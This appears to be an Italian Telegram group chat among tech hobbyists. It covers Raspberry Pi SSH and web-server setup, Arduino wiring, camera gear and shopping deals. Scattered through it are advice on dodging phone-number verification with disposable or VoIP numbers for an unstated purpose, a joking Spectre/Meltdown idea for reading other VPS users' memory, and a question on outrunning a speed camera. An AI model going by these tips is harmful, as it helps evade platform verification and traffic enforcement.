Scusa non avevo intenzione di essere sgarbato, ma preferirei esporre specifiche sulla questione in privato a qualcuno che accetterebbe di aiutarmi.
Come fa uno a sapere se può aiutarti senza sapere cosa cerchi?
Il rasp mi regge se attacco l'alimentazione al mio pc?
^
Direi di no
Fisso?
Comunque se è un Pi Zero no problem manco con un portatile
Pi 3 con un fisso parte ma va molto più lento e se la scheda madre fa schifo rischi di romperla
 e altri di Roma, ci siete mai andati alla garman? Vicino alla fermata Lepanto della metro a
Nop
Sono in tutt'altra zona
Hanno 1 sala con Dolby Digital e Dolby atmos con proiettore 4k

E un'altra ancora con un proiettore 4k ma un po' più scarso
Strano che non lo conosci
Vendono amplificatori, casse, proiettori ecc.
Ah ci fa concorrenza
C'erano Delle cuffie sennheiser che costavano 899€
Erano marroni, credo in pelle
Forse ho capito quali sono
Il modello non ricordo
Ma tu fatti 160km di macchina e vieni da noi 
Perché?
Ahahahaha l'ho presa a random da Google immagini 5 minuti prima della pubblicazione 
E comunque lui ha 800 views 
Perché a Formia (città abbastanza più a sud di Roma) c'è la Sound & Light
Ehm...sono di Fondi io
Quelli che mi hanno regalato tutti gli speaker della Jamo
Ah io sono originario di Formia
Ci scrivemmo in privato, non so se ricordi
Ah sì sei tu
Ho comprato il cavo HDMI in fibra ottica
10m 150€
devi darmi minimo 5€ con tutte le volte che hai usato quello sticker ❤️
ma sei pazzo
L'ha detto quello che mi ha venduto il proiettore
Che serve per il 4k
Wtf
come volevasi dimostrare
Esiste eh
Ma se l'HDMI 2.1 arriva fino a 8k 60 fps...
E allora quello è pezzo di merda
Devo collegarlo dall'amplificatore onkyo all'optima uhd400
Credo proprio che tu abbia truffato
Sono 8-9m
Non serve per niente un cavo da 150 euro, bastava un qualsiasi cavo HDMI 2.1
"Quelli non sono buoni" cit.
Pure i 2.1 costicchiano eh
Si ma non 150 euro
Che poi il proiettore non è nemmeno 4k nativo
Ma allora
Ha dei così dentro che si muovono ad alta velocità e duplicano i pixel
Quindi da full HD diventa 4k
Che proiettore è?
Optoma uhd400
Comunque il cavo da 48Gbps (quello più costoso che su Amazon si trova a 30€ / 2 metri) serve solo se ti serve una profondità di 8bpc o l'HDR
Altrimenti il 4K lo tengono anche i cavi da 5€
Il proiettore supporta l'hdr
Ma hai detto che è 1080p
La carta dice 4k
Ma non è 4k effettivo
Eh e tu che segnale gli devi mandare?
Boh
La presa HDMI è 4k
Sarà tipo i proiettori che abbiamo a scuola, arrivano a 1080p ma in realtà downscalea 640x480
Costa 1500€
regazzi questo è un prezzo bomba dalla germania ve la consiglio tanto




gienta, stavo pensando, come faccio a convertire un valore da 0 a 255 (scala di grigi) in rgb con un cambio di colore continuo...del tipo che a 255 è rosso e a 0 è blu e in mezzo tutto il resto della scala di colori rgb, come posso fare a fare questa conversione tipo?🤔🤔🤔
Con cosa la devi fare??
 ho bisogno di te
Dica
Qui come mai l’integrale di f(x)xg’(x)= f(x)g(x)?
Intendo [f(x)g(x)]’
È semplicemente la derivata di un prodotto
Allora ragazzi...ho bisogno del vostro aiuto
è una delle poche dimostrazioni che mi ricordo LOL
d(f*g) = df*g + f*dg....
Devo riuscire a procurarmi più numeri di telefono possibili
Come posso fare?
...
I VoIP non vengono accettati
Qualche soluzione?
WTF 
Giusto grazie mille
Nel dubbio... conoscete qualche vps gratis
È un bel progetto
Ma mi devo riuscire a procurare questi numeri
Ma cosa?
Vedrai nei prossimi giorni...
Okk
E quindi se integri a destra e sinistra, per la linearità dell'integrale, se sposti di qua e di là ottieni la formula dell'integrazione per parti
Però prima devo riuscire a procurarmi i numeri
Non so come aiutarti
Grazie comunque
Prego
cpp....o meglio...java di processing
beh per fare due conti le definizioni sono identiche quindi
ciao, come scompatto l'immagine di arch sul rasp??
da windows?
Installa Linux poi usa quel comando
ok grazie mille
:D
e poi come faccio??
Lol

se mi mandi qualche foto della postazione ti dico cosa prendere per sistemarla e come fare
Se mi ricordo domani, però prima devo segare un pezzo di scrivania

  ti devo chiedere una cosa...
🤔 con questa è una cazzata farlo, hai anche i cassetti volendo
C'è la clip del microfono che non fa chiudere lo scompartimento dei cavi
dimmi
basta spostarlo no?
Uhm no purtroppo



guarda qua.... è assurda un affare... dalla germania a 129€.... se vuoi mettila fra i coupon... secondo me merita tantissimo
Avevo provato a fare una roba del genere per metterlo laterale, ma era troppo scomodo e lontano
eh ma è aliexpress, non è supportato dal bot purtroppo
anche senza coupon è fantastica :D
Eh grazie al caxxo lo so è quello che voglio fare solo che chiedevo come fare per evitare di mettere direttamente 255 if
🤔capisco..e invece usando lo spazio che c'è tra la maniglia del cassetto e il bordo della scrivania? ti passa il supporto a L?
Provato, è scomodo
lo so, ma Scontino si incazza se pubblico cose che lui non supporta
🤔sulla gamba della scrivania invece?
Troppo lontano, ma risolvo segnando un po' il tavolo
la cr10 la ho pagata 300€ questa a 129€ è uguale solo più piccola... :D 100 volte meglio della anet, se vuoi levarti un vizio te la consiglio tanto  :D
ecco appunto, vai di seghetto alternativo, ma prendi bene le misure e taglia con calma, perchè è un punto dove se sbagli si vede tutto
eh lo so, ma io al laboratorio ho una Zortrax non me ne faccio nulla della CR10, anche se è un ottima stamapante casalinga..non avrei neanche lo spazio dove metterla volendo
Lo so rip
Starò attento
🤔ma lo scomparto dei cavi non ha un buo centrale per caso? dove passano i cavi del monitor intendo
La ho attaccato la clip
la puoi usare anche per i tuoi vizi? è una bella bestiaccia
🤔fammi una foto in quel punto che vediamo come risolvere e fare meno danni possibili
certo, basta che compro il materiale a parte e la posso usare..quello del Comando ha le etichette a parte, rientra nel budget annuale
uhhhh :D
ottima idea il compressorino..è 220v oppure 12v? ne vorrei prendere uno da montare nel doppiofondo
non farà poca aria? mi sembra uno di quelli da macchina... e soprattutto... non c'è il rischio che condensi acqua e faccia casini? D:
nah, 4 dadi a farfalla e si smonta in 30 secondi volendo
non odi i cassetti? XD a me da tanta noia avere lo spazio occupato sotto il piano... non posso incrociare le gambe
il mio dubbio è che mandi condensa sulle parti elettriche
fidati che sono comodissimi
eh lo so, quando buco lo sono un sacco ahah
ma io non ho chissà quali parti elettriche nella scrivania, solamente gli hard disk sono importanti, e si tolgono in un secondo..poi per la condensa, basta spruzzare 10 secondi a vuoto e risolvi
 :D stupenda..però il binario è parecchio corto secondo me
allora poi mostra il montaggio :D
15 cm?
non ho capito, le passo mio marito 
ovvio
ahahh ho sbagliato il messaggio, il binario quanto sarà, da 13-15 cm?
Mmh voleva darmelo lungo ma le ho chiesto apposta 25cm perché di più non ha senso
Poi diventa scomodo fare movimenti cinematografici perché i pali sbattono in giro
no 25..basta guardare il corpo macchina e l'obiettivo..già soltanto la testa fluida è più di 10 cm
capito ottimo montaggio, adesso volendo mancano un faro/flash e il monitor esterno
Ah va beh 25 non è male, io considero la 5100 piccola e non avevo riferimenti
Ho la 810 e no ho nemmeno idea di dove sia il menù video
Faretto volendo c'è
La maniglia in legno è fantastica invece: una comodità...
Calza proprio stupendamente alla mano
Elegante
Oddio
montalooooooooooooooooooo
il buon Toto ne capisce parecchio di attrezzatura video
Tieeee
bellissimoooooooo..hai preso anche l'aggeggio per la messa a fuoco
Rasp ha porte già settate^
?
ora ci vuole un bel Manfrotto però, per rendere giustizia a quella testa
Siii un sacco
Perchè mi sto provando a connettere in ssh e mi butta fuori
non mi dire che non ti piace..finalmente si è attrezzato bene 
La roba più bella sono il coso della messa a fuoco e la testa Manfrotto
🤔perchè vedo un muro insolitamente sgombro, e con attrezzatura e colle vicine? che devi combinare?
Si anche perché balla più di un ospite della Carlucci
Niente, probabilmente è solo caduto tutto
Almeno a giudicare dal volume di cose sul pavimento
ma no dai, per registrare seriamente è ottimo il rig, non scherziamo..poi se deve smontare la camera per fare video in esterna, 2 perni e via, e lascia tutto montato e pronto a casa
Arcade machine
Alcune secondo me non sai manco da quanto stanno lì... Se tipo magari c'erano ancora i tedeschi
ma che fa, balla la macarena sto treppiedi?
Nono se devo andare in esterna faccio il grosso col cage 
È degli anni 90 poraccio
stile RAI
il cabinato? era ora
Bisognerà in qualche modo attirarla la figa che passa
Anche tu... 
Anch'io ballo infatti, specialmente se prima bevo 
Saranno due progetti diversi ma abbiamo anche il cabinato fullsize
Ragazzi...
per l'esterna ti serve questo però :D
Mi serve una mano
Sparare dove posso trovare 10 numeri di telefono funzionanti?
Cos'è sta poverata da 60€?
🤔pagine bianche?
vabbè era per farti capire il modello
Metto due maniglie davanti, allungo le sbarre e ci sono
Ti ricordo che a novembre non avevi 50 euro per andare a Roma?
No, devo avere il controllo
Looool
Ho bisogno di aiuto col raspberry, qualcuno mi aiuta?
Non mi fa la pass quando faccio su e non posso connettermi via ssh
🤔qualche voip?
Ci avevi già pensato, ma il sito riconosce i VoIP
 Scelgo TE!!!!!!!!!!!!!!!!!!!!!!!!!!!!
What?
Che distro?
Quella che usate nei vostri tutorial
Ricordati che alcune distro non ti fanno scegliere la password di root all'installazione
La ho scaricata ora
🤔 non saprei allora..qualche servizio internet di numeri usa e getta?
E quindi se vuoi usare l'utente root devi prima cambiare password
Raspbian...
Maniglie in legno con Arri Rosette ovviamente
Si
Credo
Devi fare sudo su e dopo passwd
Il file che ho messo sulla sd si chiama "2018-03-13-raspbian-stretch.img"
Vedo che sei studiato
Vi prometto che per il milione compro una Arri Alexa con un kit di Summilux 
figata, tipo quello nuovo di Toto..lui ha pure la giraffa, anche se secondo me è scomodo..se lo usi soltanto come cam fissa ok, ma per l'esterno la giraffa non va bene
Vedi che a noi non cambia la vita, sei tu che sei fissato 
Che pass devo usare?
Rendete admin quest'uomo
Devi fare sudo su
E poi passwd
E mi chiede la pass
Ahahahahah
Quando fai sudo passwd quella dell'utente che stai usando
Raspberry
La tua insomma
Non ho capito
Scrivo passwd?
Sul terminale
Si
Manda il comando passwd
Tu chiede la password?
(per il milione di euro ovviamente, non di iscritti... Anche perché servono tutti )
Rispondo io...si
Si
Devi fare sudo su
Ricominciamo...m
Chiudi il terminale
Ok

Riapri
É normale che fischia?
Fischia?
Si
É basso ma lo riesco a sentire
Ultima visto dall' otorino?
Chiedi
Non ho capito
No
Allora
Apro il terminale
Non mi è mai capitato che il rasp fischiasse
Sudo su
Ok
stai sudando davvero mi sa

Costano un pochino l'una
Col milione voglio di più di una macchinetta per fare video
Ci sono riuscito
minimo minimo una RED per ogni stanza
Ed era ora
Ma le red sono da poveri nel cinema
Ma averne sei o sette no 
Non é il rasp che fischia
É il monitor
Vabbe
noi siamo poveri ti ricordo non ti chiami mica Linus Sebastian oppure Ed
Le red sono in fascia youtuber ricchissimi e film a budget medio/basso
Per l'ssh come devo fare?
Hai impostato la password?
Si
Hai visto il nuovo... 
... di MKBHD?
Hai Linux o Windows?
Winzoz
Ho già putty
Se mi provo a collegare mi butta fuori
E ci credo
no cosa??? linka
Instagram
Quindi?
Che ti dice?
visto adesso..cosa essere quel mostro?
Praticamente è un braccio robotico (velocissimo, peraltro) che gli sballotta in giro la RED facendo inquadrature super smooth
comunque quell'8% è alquanto inquietante Marco..dagli da mangiare all'Opo
Hai attivato ssh su rasp?
No
Ho anche capito come fare
Se lo dici tu...
Credo
Mi collega
Che?
Sono entrato su pi
Con la password raspberry
Okay...
Cambiata
Altro problema
Sullo schermo ho i bordi neri
Come li levo?
Da raspi config
HDMI overscan, qualcosa del genere
W8
Dove?
A ok
Trovato
Ok riuscito
Altro problema
Se accedo come pi va tutto
Se accedo come root no
Ok
Come posso risolvere?
Definisci "tutto" 
E cosa non va?
Se entro come pi funziona normalmente mentre se entro come root mi da sempre pass errata
 comunque Marco, non ti offendere, ma non puoi competere con cotanta gnoccaggine  altro che fotocamere
raga scusate posso mandarvi uno screen di una cosa epica?
 
Che pass metti?
Quella che avevo messo con sudo su
Se ti dice che è sbagliata vuol dire che la scrivi male
No
Hai fatto sudo su
passwd?
Si
Mi ha chiesto la pass e la ho impostata
Prova così
Oppure riprova a fare sudo su, anche se fai prima a fare sudo su per loggarti come root
Se quando entri come pi fai su ti dice anche li password sbagliata?
No
Anzi io ho fatto sudo su, ora provo
Ok con su va
Che sia un impostazione o roba simile?
Sì hai bloccato l'accesso ssh come root
sudo nano /etc/ssh/sshd_config
Se proprio lo vuoi attivare... Ma puoi sicuramente farne a meno
Su filezilla come faccio su?
Filezilla ssh? 🤔
Non ho capit
A cosa ti serve l'ssh su Filezilla?
Se io ci metto un sito apache non é fuori dalla cartella dell'utente?
Basta impostare i permessi in modo che l'utente che usi possa scrivere nella cartella di apache
Chicca arrivata stamattina  vediamo chi indovina cosa sia
Non lo so fare
Ti conviene imparare questo piuttosto che dare il permesso al root di connettersi via ssh
Fingerprint
E come faccio a dare il permesso ad uno di scrivere in una specifica cartella?
Devi innanzitutto capire chi è il tipo... E chi altro deve poter scrivere su quella cartella
Modulo di Impronte Digitali 
Lui e io
Poi devi capire come funzionano i permessi su linux
So solo come funziona il chmod
 giusto?
Ecco è un punto di partenza
il permesso di tentarti 

 :P
Allora, per prima cosa gli creo un utente?
Lo hai già no?
Uno per il tipo dico
Per quello che può scrivere solo su apache e sulla sua parte di memoria
Ah sisi
esattamente..configurato con Winzozz Hello
Un attimo
esattamente
Gg
Uso adduser?
un ulteriore sicurezza per il portatile
Arrivato il lettore?
Come lo hai settato?
yes
Fidanzata ad accesso vietato
Usa direttamente pi
Per l'account di un altro
Ah, allora si
Che può fare solo su apache e sulla sua parte
con Windows Hello, con pollice e indice..basta scaricare i driver dal pannello di controllo e poi settarlo dalle opzioni di accesso..5 minuti
Ma poi non é root?
 vedo che ci capiamo
Costo?
15€ su Gearbest
No, per permettergli di usare sudo devi aggiungerlo in /etc/sudoers
Oks
Ok
Tenetevi 4€ per domani: vi pubblico un'offerta che non potrete rifiutare
E per fargli usare solo una cartella fuori dalla sua parte?
Di cosa?
chown
Marco Corleone
Da root?
Basta essere il proprietario di quella cartella
É fuori da root
Fai da root che sei a posto
Ok
Chown poi?

E per il sito guardo una guida cone debian?
In realtà basterebbe man chown da terminale per vederlo
Per installarlo proprio
È già installato
A
Dove?
which chown
Dico apache per il sito
sudo apt install apache2
Anche se Apache non è un granché ormai, meglio nginx
E come funziona?
Mi stai confondendo
Vuoi Apache o nginx?
É uguale
Mi serve un sito web
Vedi il primo link
Vuole fare casino
Posso scaricarlo con questo?
Come faccio a misurare la temperatura di una superficie piatta con un termistore sferico?
Si
Woooooow non sono l'unico
 ho fatto il comando ma non mi prende quelli del primo link
Sto seguendo la guida che mi hai mandato
Perché quelli sono comandi per redhat
Cioé?
Un’altra distro
Non sta funzionando nulla
Che errore ti da?
Nessuno ma non succede nulla
Come vedo se ha installato tutto correttamente?
Va beh faccio domani
Dal browser ti colleghi all’ip del raspberry
Non succede nulla
Hai fatto partire il server?
Come?
La guida spiega tutto
C'era un comando da fare?
systemctl start apache2
A
Non lo dice sulla guida
Davvero?
Yep, ho quello verde
 non c'era sulla guida
Alla fine fa il suo dovere
Non l’ho scritta io
Io sto vedendo questa 
gratis è impossibile 
SkySilk gratis finché resta un servizio in beta
in realtà è supportato, solo che Marco non ha il referral
non continuare a taggarli, non ci sono solo loro in questo gruppo
soprattutto a mezzanotte
che bello dormire di nuovo più di 4 ore a notte :D
+1
Che bello svegliarsi col sol... ah no siamo nella Pianura Padana
Sigh
Sullo store dji ita costa 109

 ‎€1‎05‎.9‎5 ‎in‎ve‎ce‎ c‎he‎ €‎13‎0.‎40
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 1‎8.‎75%
 Store: Banggood
 

Lol
Ma online lo si trova pure a meno
Tra uno 
 mesi, bangood lo metterà ad un prezzo stracciato, ne sono sicuro
*che bello svegliarsi con la nebbia
e viverci sempre
appunto 
la nebbia è bella
beh....ora però mi sento inutile, non ho nulla da fare....o meglio, quelle poche cose che devo fare non ho voglia di farle, datemene altre
Batterie per un drone 250?
Capisci come settare un server mail completo ☺️
mmmhh...ho sentito bene? dici di cannibalizzare un microonde e una macchina per caffè per creare qualcosa di improponibilmente pericoloso? 

ma
non ho detto un mail server 
comunque ho già fatto qualcosa di simile con i socket
esprima le sue conoscenze
non funziona per il caxxo ma sssshhhhh
ah 
dettagli
nel senso che per inviare all'altro un messaggio l'ultimo ad averti inviato un mex deve essere stato lui(non sono riuscito a implementare i thread perchè sminchiavano tutto)
se poi si tratta di fare solo un client ci vado brutale di powershell io
Qualcuno che sa usare raspbian o linux in genere mi può scrivere in pvt?
cosa devi fare?
 Canon Powershot G7X

 675€ (Anziché 1000€) ‼️
credo
Non so se posso mettere il link perché contiene referral
Si potrebbe usare l'ESP8266 per trasformare il mio impianto stereo in wifi?
Se ha un uscita aux puoi utilizzare un raspberry
rip
bello telegram che è off, apro il server irc se volete i dati li ho inviati l'altro giorno, server : 
 porta 6669 senza ssl
comunque io è tutta la mattina che programmo in java di processing...sto facendo il flappy bird dei poveri, per ora ho fatto ancora poco, dovrei riuscirci comunque
aaaaa
Telegram é morto
Un account che può modificare solo il contenuto di una cartella fuori dal suo account
*era
prima che muoia di nuovo che lo sappiate
Avranno messo i server di backup
Ho perso tutta la mattinata
Telegram down tutta la mattina in Europa, ovest della Russia e Medio Oriente perché è mancata la corrente ad un server cluster 
Quando leggerete questo messaggio vorrà dire che ha ripreso a funzionare (forse )
help 
sudo chown -R utente cartella
Siamo tornati online!
e come faccio più siti sulla stessa macchina?
con porte diverse?
questo con le porte
?
Eh si
Oppure compra due domini
quella era l'intenzione
Ma ripeto, con nginx sarebbe meglio
come li collego poi?
Con apache non ne ho idea, su nginx basta fare il controllo sul dominio e reindirizzare all'host giusto
nginx è difficile da usare?
No, ci sono un sacco di guide se vedi su google
me ne mandi una che posso usare col rasp?
è rimorto?
qua va, ho un po' di gruppi in cui è defunto ancora🤔
Comunque guardiamo i tuoi video per la qualità dei contenuti e non per la qualità dell' immagine....
Vps con free trial Che non chiede il numero di telefono?
Usa qualche numero preso dai siti che li mettono a disposizione per le registrazioni
Tipo?
Costano 3 euro
Lo so
Ma voglio prima provare una cosa
Oppure usa Text Now
Vuoi vedere se funziona ancora spectre/meltdown per accedere alla memoria delle altre VPS?
Non funziona
No, però sarebbe interessante ora che ci penso 
Usa Groove IP
Sarebbe?
Ma si trova nei negozi tipo brico pasta/silicone che conduca bene il calore?
il silicone isola non conduce calore
Un'applicazione per i VoIP
Ah, beh tipo qualche colla

Pasta termica
Loool
Ah, proverò grazie del consiglio 
a già, e si sta tutti in 

comunque sappiate che semmai muoia telegram ci sono ioooo
Che culo 
non è culo
è skilllssss
Spe
Server?
l'ho ripetuto non so quante volte, sali un po' la chat
^
C’è solo quella? (Quella per pc per capirci)
Guardalo su eBay

guarda questo
Perfetto grazie mille
Ragazzi avreste un grafico da consigliarmi?
:)
Quanto paghi?
Il prezzo che mi fa il grafico in base alla qualità e la quantità del lavoro
Non capisco

 ‎€5‎.7‎0 ‎in‎ve‎ce‎ c‎he‎ €‎8.‎14
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 2‎9.‎98%
 Store: Banggood
 

Ha un sacco di stile
Peccato che il bot sia defunto e senza quello pubblicare offerte è un pain in the ass
Ahahah
Ma se bevi dal lato del proiettile è scomodo
Mmh perché 🤔
Il proiettile devia il passaggio
Del fluido
ok, hai 2 opzioni..1) tagli con il seghetto e buonanotte oppure 2) per fare un lavoro più pulito: 1)dove hai la base del braccio del mic, non tagliare lo sportello del passacavi, taglia il pezzetto di scrivania, così da fare rientrare la base 2) prendi una fresa a tazza, fai 2 buchi sul passacavi della scrivania per farci passare i cavi di casse, led e tastiera, e ci incolli 2 passacavi di plastica come quelli che ho io
Si ma a metà bicchiere... Se devi mangiarci il gelato ok ma a un fluido non dà fastidio

ok, un consiglio allora..dove devi tagliare mettici dello scotch-carta, altrimenti ti scheggia la scrivania e viene una schifezza
maaaa fare come me e lasciare tutto come sta facendo finta di nulla e vivendo come un barbone?
non tutti siamo come te Giulian..io appena vedo un cavo fuori posto sono li a sistemarlo, non li sopporto in vista
è una malattia cristo
nah, semplice ordine
 
 hai visto?
Fiiigoooo
50mK saranno millikelvin? 
yep..telecamere Flyr
 come funziona Google home mini? Sei riuscito a far riprodurre una playlist a quel coso?
Tu gli parlo e lui ti risponde, se gli dici riproduci playlist <none playlist> lui la riproduce con il player predefinito che puoi cambiare: Spotify, Google play music, ecc
Grazie, lo hai per tu?
Devo mandarti una foto dell'ufficio
Abbiamo cavi ethernet che passano sopra le canale tue contenenti altri cavi (sia corrente che altri ethernet) 
Si esatto mi è arrivato ieri
Non immaginate cosa mi hanno detto
Il tutto tenuto abbastanza ordinato dal nastro biadesivo.
O almeno lo era fino ad oggi, non c'era più superficie di biadesivo per un cavo in più
Funziona bene?
Mi hanno detto che sono io paranoico a cercare di distaccarmi da big G
Perché il pericolo non esiste
Si è si sente anche abbastanza bene, lo ho integrato con homeassistant
Alla fine hanno detto che dei dati di un 14enne che non ha influenza ne soldi non fanno niente
Io stavo valutando l'acquisto
Secondo me però solo il mini conviene, il modello di 149 euro è inutile
Te hai preso quello normale? 
È ovvio che stavo pensando al mini 
Nono il mini, ma in teoria cambia solo la dimensione degli speaker ma tanto io non ci ascolterei della musica se volessi la qualità, un bello stereo con un Chromecast audio collegato con l'ottico è un mini per l'assistente vocale
jesus christ superstar
manda manda che sono curioso
eh te la faccio domani
notizia di oggi: ci puoi collegare anche gli speaker bluetooth adesso al Google Home, hanno rilasciato un aggiornamento
ma tranne il cavo di oggi era anche bello da vedere
ricordati che sono curioso

Si ma la qualità audio e bluetooth vanno poco d'accordo anche con aptx quindi il Chromecast audio è una soluzione
ovviamente..ma se hai già qualche speaker puoi comunque accoppiarlo..non è che in bagno sotto la doccia ci porti il sinto Yamaha con le casse Polk Audio 
salve
Benvenuto 
Che casino
Mi aveva fatto crashare telegram
Bhe si può. Oppure ti porti DAC teac UD 503 con un doppio ampli Jeff rowland model 925 mono e delle belle tannoy Revolution xt 8f
Ho bannato ma forse sono più di uno
Ho perso il grado di helper mi sa ahhaha
Sonov70
Sono tanti bugs
Sono 13
Beh
Mi metto al lavoro
??
C'è stato un po' di spam
Tramite userbot
Ah
Stiamo bannando, poi faremo pulizia
Tentato storm?

Si
Grazie
Ma certo che lo banna
Povero bot
E in tutto questo devo ancora pubblicarvi l'offertone perché il bot di merda non va 
io mi sono accorto ora del casino
Mafia style?
Lol stan cercando di stormare
ce ne siamo un pelo accorti
Già bannati tutti
Finiti
Io ho spero il gruppo ed ho visto messaggi arrivare
comunque sto qua ha fatto esplodere la mano o sbaglio?
gearbest?
voglio dire....ha inviato un boootto di messaggi, oppure era per tutti quegli account? sarebbe da abbassare un pelo il limite di flood mi sa🤔
giochi ancora a darkorbit? HAHAHA
ovvio
COME S
sei messo?
non ci torno da un botto ma pensavo di tornarci tipo stamattina che iniziano le vacanze
demmerd
LOL
ho farmato uridium come no schifo ma sono comunque pochi
Tipo?
500k?
tipo 9k
Ragà una roba come faccio a prendere in live i dati di un form e metterli su la stessa pagina del form?
Però deve essere live
capiscimi, io ci giocavo 7 anni fa, ora è tutto semplificato ma non c'ho il tempo di tornarci
io devo ringraziare i bot
sono full lf3, 4 lf4 e ho ancora 540k uridium da spendere hahaha
mo' i bot non funzicano più
lo so hahaha
mo infatti non li uso
Io ci giocavo anni fa

ecco e io sono full lf3, di cui tipo 5 presi con uridium(ero povero sentendomi ricco)
io gico quando non so cosa fare hahaha
quella cosa provoca dipendenza, ora ripensandoci mi fa venir voglia di passarci le giornate, non so manco come ho smesso

Ma saranno almeno 4 anni che non ci gioco
toh ho scoperto che ho 60 chiavi casse verdi hahaha
si ma così non è neanche bello però
sono almeno 1/2 lf4 hahha
Il coupon non va
Comodo kit cacciavite con 25 punte
 Solo 2.45
✂️ COUPON: 

 

Sarà esaurito, era valido solo per 200 pezzi
Ah ok
Raga la mia tv ha una presa lan obsoleta
Ed è una tv samsung del 2012-3
Netflix ✈️
Vi sembra possibile un circuito del genere?
non è alimentato arduino
Appunto
L'ho trovato in giro e mi chiedevo se fosse possibile
Non è il primo che vedo 🤔
al ground è collegato, mancherebbe solo il 5V
basterebbe un cavetto dal cerchio al Vin
ma probabilmente contano che l'Arduino te lo alimenti a parte
va bhe basta un cavetto da +12 a Vin
no non va
Mettetevi d'accordo ahaha
mi stai ostacolando la mia trasmissione
mi sembra che il regolatore funzioni  con alimentazione a +12 XD, non ne sono certo
Mi sembra un po' troppo
Looool
quello che butti dentro Vin può anche essere 5V
quel pin sulla scheda rossa è fatto apposta per alimentare Arduino
sì ma mi sembra funzioni se alimenti il driver a 12V
non solo, c'è un cosetto piccolo da staccare in base se l'alimentazione che dai alla scheda è maggiore o minore di 12V
Ragazzi scusate ma la memoria di un modem router è di sola lettura?
Ce ne sono tipo 3
due sono di lato ai 4 pin in basso a destra giusto?
E altri due che ho staccato
Exatto
uhm... nel mio modello ce n'è solo uno lì
Quindi 5v to vin?
ok funziona, comunque può anche collegare in parallelo la batteria direttamente ad Vin su arduino ahha
esatto, quel +5V è un output
beh ovvio 
No che devo saldare robe
però non mi ricordo quando devi staccare quel cosetto e quando no
perché devi saldare robe?
Eccolee
Grazie 
era un "no perchè non ho voglia di saldare robe"
basta un cavetto dal +12 del drive al vin di arduino OPPURE dal +5 del driver al +5 di arduino
Ah... Ahaha
Mi sa che devo fare come dici te perché il pin di Arduino è occupato dal sensore
cos'è sto robo
Robottino, fieramente costruito da me
Credevo dovessi saldare la batteria a un altro cavo ma non era così
mostralo per intero ahhaha
Fammelo finire prima ahaha
ma è lego? ahah
No, era un regalo della mia ex
Soltanto che ha frainteso kit robotica con gioco bambini
dopo che glielo hai fatto notare ti ha lasciato?
Quindi lo sto upgradando, spendendo tipo 5/7€ (tutta roba cinese che ho aspettato per 1 anno)
No
Anche se sinceramente era meglio una semplice cintura che sto coso che andava con un pannello solare
Si si funziona stra bene...ora sto smattando per collegarlo a openhab
beh io ho comprato il kit con 4 motori a 10€, lo ho da 1 anno e non lo ho mai montato
Lo consiglieresti?
Eh ma io sono studiato
E volevo capirne un po di Arduino
A Bo... In casa mia ci siamo già abituati tutti
comunque quel driver è odioso, non funziona alimentato a 5V
È figo ...di utile ha le notizie,timer, promemoria, domotica e Spotify
All'inizio seguivo un progetto di Progetto Arduino con dei transistor BC547 tipo
Ma non giravano abbastanza forte i motori
e ne usavi 4? XD
1 per motore
Sono motori di un joystick della PS2
Ma mio padre fa che non sono transistor di potenza, quindi non andavano bene...mi fa di utilizzare un MOSFET o altro
cioè andavano solo in un verso?
Nono sono due motori, quindi andavano avanti e indietro...il fatto è che non si muoveva il robottino
Misa che sono i motori che non riescono a muoverlo

Boh devo ingegnerizzarlo
Tutto sti fili per 2 motori?
ok gente, ce l'ho fatta, ho fatto il flappy bird dei poveri
E un sensore
(per pc perchè sono povero e non ho voglia di passare il progetto sul telefono per poi compilarlo con il compilatore mobile e farne l'apk)
 ecco a te la bestiolina
Probabilmente anche il motore originale non supporterebbe il peso
Ni erano piccolini ma giravano bene
Però avevano una serie di riduttori di coppia
non avevano una batteria da 9V e un arduino sopra
Non so che motori metterci
questi 

Ma scusa non hanno meno potenza di quelli che ha su?
nono questi vanno bene
Misa che non va bene l'approccio motore ruota
Ci deve stare per forza qualcosa in mezzo
perché scusa?
quei motori girano troppo forti
Perché ci vuole qualcosa che aumenti la coppia dei motori
ma non sono i motori della vibrazione?
Appunto, io ho detto "Cazzo fanno girare un pesetto, un robottino vola"
bah, il pesetto non ha carico
quei motorini a 4€ riescono a fartelo muovere cmq
Vedrò di upgradare
Più probabile che siano i 5V per la logica
ook, è un pelino buggato...ma ci sta, mo' provo a condividerlo🤔
Nono c'è integrato uno stepdown 
E i 5v per la logica sono tra i pin a dx?
enA enB che vanno anche in pwm
ha un 78m05
Sicuro? Io li non lo vedo
è già una droga per me, essenzialmente essendo tarocco e non volendo io usare la tastiera, usate direttamente il mouse...*mette il dpi a 16000*
Vedo solo il ponte h
e questo è per i poracci rimasti al 2000 a.C. con i 32bit...tipo io fino a 2 anni fa
Bello bello, maaaaa... Uscire con gli amici no eh?
ci ho messo tipo 2 ore si o no eh
mi dispiace ma nonna mi diceva sempre di non aprire exe degli sconosciuti
Ah ma allora manca roba in quello "schema". Che poi usare fritzing.. fa male al cuore..
non avevo nulla da fare...era mattina....le ho buttate li, adesso che mi sono ricordato l'ho terminato con le collissioni
Io ho trovato il tempo per fare questo
Stessa cosa io lol
se vuoi ti invio direttamente i file da compilare
No grazie
ecc qua
Ma perché .pde?
io avevo la versione MATLAB XD
è processing ._.
ti assicuro che esiste
JAVAAHHHH
Mai visti 🤔
Io lo ho sulla calcolatrice
in realtà è java....ma senza java :D perchè non è brutto, è fatto bene, e funziona a differenza di java vero :DDD
Portalo su p5
si ma per me qualcuno l'ha fatto pure in brainfuck
nn c'ho cazzi di farlo
non mi chiedere perché ci sia quel componente perché non lo so... penso perché ne avevano molti in magazzino :D
qualcuno usa nginx
?
lo so
il fatto è che mi da 403
ossantocielo
Se ho una fotocamera a 60 FPS a che velocità devo andarmi per uscire sfocato?
(fotocamera del tutor autostradale)
e te cosa facevi in lab mentre spiegavano matlab?!
Odiavo matlab
ti dovevi impuntare e usare fortan lol
Cobol
quando non sai cosa fare
Come impiegare 3 giorni solo per implementare il metodo della bisezione
conoscete un modo per estrappolare il testo di una mail e caricarlo su una pagina web/file dropbox?
Forse con ifttt
When you can't even afford Ai
e vede il testo della mail vuoto, forse perché non è formattata
Spero tu non l'abbia pagato
se lo avessi fatto sarebbe un male?
non credo proprio
Per il tuo portafogli si 
no comunque non l'ho pagato
per il momento
se dovessi iniziare a farci qualcosa di serio lo compro

Se sei sicuro di rientrarci perché no
la cosa che mi sta sul cazzo e' che dovrei usare per forza windows
Ho un'idea...
Gimp
Veramente, ho la memoria muscolare pazzesca per l'editing: appena seleziono la clip da cancellare mi parte il dito lì
